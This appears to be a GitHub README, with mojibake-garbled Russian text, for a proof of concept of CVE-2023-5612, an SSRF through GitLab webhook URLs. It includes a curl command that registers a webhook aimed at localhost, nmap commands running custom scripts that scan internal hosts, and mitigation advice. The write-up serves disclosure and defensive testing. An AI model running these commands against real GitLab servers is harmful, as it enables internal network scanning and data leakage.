# CVE-2023-5612 ‚Äì GitLab SSRF via Webhook URL (PoC & Analysis)

## üìå CVE Overview
- **CVE-ID:** CVE-2023-5612  
- **Severity:** High (CVSS: 8.1 Base Score)
- **Type:** Server-Side Request Forgery (SSRF)
- **Component:** GitLab CE/EE Webhooks
- **Affected Versions:** GitLab CE/EE < 16.2.7, 16.3 < 16.3.4, 16.4 < 16.4.1

## üß† Description
An SSRF vulnerability in GitLab CE/EE allows attackers with valid Project Maintainer access to send crafted requests to arbitrary internal services via malicious webhook URLs. Exploitation leads to internal network scanning, metadata leakage, or further pivoting.

---

## ‚úÖ Exploit Conditions
- –£ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –µ—Å—Ç—å **maintainer**-–¥–æ—Å—Ç—É–ø –∫ –ø—Ä–æ–µ–∫—Ç—É
- GitLab –Ω–µ –∏–º–µ–µ—Ç –∂–µ—Å—Ç–∫–æ–π —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –∏–ª–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ URL-—Ö—É–∫–æ–≤

---

## ‚öôÔ∏è PoC Steps (Manual)

```bash
curl -s --header "PRIVATE-TOKEN: <TOKEN>" \
     --data-urlencode "url=http://127.0.0.1:8888" \
     http://<gitlab-host>:8080/api/v4/projects/<project_id>/hooks
```

–£—Å–ø–µ—à–Ω—ã–π –∑–∞–ø—Ä–æ—Å –≤–µ—Ä–Ω–µ—Ç `201 Created` –ª–∏–±–æ –æ—à–∏–±–∫—É –≤–∏–¥–∞ `401 Unauthorized`, —á—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ SSRF-–¥–æ—Å—Ç—É–ø.

---

## üõ† NSE Script (Manual Trigger)

```bash
nmap -p 8080 \
  --script ./gitlab-ssrf.nse \
  --script-args gitlab.token="<TOKEN>" \
  <target-ip>
```

## üß™ NSE Script (Bruteforce Internal URLs)

```bash
nmap -p 8080 \
  --script ./gitlab-ssrf-brute.nse \
  --script-args gitlab.token="<TOKEN>" \
  <target-ip>
```

---

## üìÇ Repo Structure
```
.
‚îú‚îÄ‚îÄ gitlab-ssrf.nse             # NSE script for manual SSRF verification
‚îú‚îÄ‚îÄ gitlab-ssrf-brute.nse       # NSE brute script to scan internal hosts/ports
‚îú‚îÄ‚îÄ screenshots/                # –°–∫—Ä–∏–Ω—ã –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è PoC –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏
‚îî‚îÄ‚îÄ README.md                   # –≠—Ç–æ—Ç —Ñ–∞–π–ª
```

---

## üñº Screenshots
- ‚úÖ –£—Å–ø–µ—à–Ω—ã–π SSRF —Å –≤–æ–∑–≤—Ä–∞—Ç–æ–º 401 Unauthorized
- üìú –õ–æ–≥–∏ nmap c –æ—Ç—Ä–∞–±–æ—Ç–∫–æ–π —Å–∫—Ä–∏–ø—Ç–∞
- üì¶ –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤–µ–±—Ö—É–∫–∞ —á–µ—Ä–µ–∑ API

---

## ‚ö†Ô∏è Mitigation
- Upgrade GitLab to >= 16.2.7 / 16.3.4 / 16.4.1
- –û–≥—Ä–∞–Ω–∏—á–∏—Ç—å outbound HTTP —á–µ—Ä–µ–∑ egress firewall
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å internal allow-lists –¥–ª—è –≤–µ–±—Ö—É–∫–æ–≤

---

## üß† Author & Contact
**Pavel Topskiy**  
[GitHub](https://github.com/TopskiyPavelQwertyGang) ‚Ä¢ Security Analyst, Red Team path  

---

## üìÖ Timeline
- **June 2025:** –ê–Ω–∞–ª–∏–∑ PoC –∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
- **5 –∏—é–Ω—è 2025:** –ù–∞–ø–∏—Å–∞–Ω–∏–µ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ NSE-—Å–∫—Ä–∏–ø—Ç–∞ –∏ —Ç–µ—Å—Ç–æ–≤

---

## üîê Disclaimer
All testing was done in isolated lab environments on intentionally vulnerable versions. Do not use this against unauthorized systems. Respect ethical hacking principles.
